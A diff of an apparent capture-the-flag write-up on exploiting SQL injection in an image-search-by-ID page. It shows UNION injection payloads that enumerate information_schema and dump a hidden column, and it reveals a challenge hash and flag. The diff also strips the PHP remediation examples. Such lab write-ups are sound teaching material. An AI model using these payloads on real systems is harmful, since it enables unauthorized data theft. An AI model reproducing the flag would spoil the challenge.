@@ -4,39 +4,37 @@
 
 Image search asked to input an ID. \
 By searching IDs manually (`1, 2, 3, 4, 5`), we discovered an image titled **"HackMe?"**. \
-This hinted that the search mechanism might be exploitable. \
+This was a hint that the search mechanism can be exploitable. \
 
-Furthermore, search functionality for images by ID is vulnerable to **SQL Injection**.
-
-By leveraging **SQL Injection**, we identified a table named `list_images`, containing the columns:
+With **SQL Injection**, we found that the schema contained a table named `list_images`, containing the columns:
 - `id`
 - `url`
 - `title`
 - `comment`
 
-Since `comment` is not displayed, we attempted to extract its data manually.
+We remarked that `comment` was not displayed, so we attempted to display it.
 
 ## Steps to Reproduce
 
 ### Identify Table Structure
 
-By injecting the following SQL payload, we listed existing table columns:
+List the existing table columns:
 
 ```sql
 5 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 
-**Findings:** We discovered the table `list_images` with the columns: `id`, `url`, `title`, and `comment`.
+We discovered the table `list_images` with the columns: `id`, `url`, `title`, and `comment`.
 
-### Extract Hidden `comment` Column
+### Display Hidden `comment` Column
 
-Since `comment` was not displayed by default, we crafted a query to retrieve its content:
+`comment` was not displayed by default, so we did a query to retrieve its content:
 
 ```sql
 5 UNION ALL SELECT id, comment FROM list_images
 ```
 
-**Findings:** The comment of id 5 contained a cryptographic challenge:
+The comment of id 5 contained a cryptographic challenge:
 ```
 If you read this just use this md5 decode lowercase then sha256 to win this flag ! : `1928e8083cf461a51303633093573c46`
 ```
@@ -58,16 +56,10 @@ fe0ca5dd7978ae1baae2c1c19d49fbfbb37fe7905b9ad386cbbb8206c8422de6
 
 1. **Use Prepared Statements** (Parameterized Queries) to prevent direct SQL injection.
 
-   ```php
-   $stmt = $pdo->prepare("SELECT id, url, title FROM list_images WHERE id = ?");
-   $stmt->execute([$user_input]);
-   ```
 2. **Sanitize and Validate User Input**
 
 Ensure that only **numeric values** are accepted when querying by ID.
-   ```php
-   if (!ctype_digit($_GET['id'])) { exit("Invalid input"); }
-   ```
+
 3. **Limit Database Permissions**
 
 Ensure the web application uses a **read-only** database user whenever possible.
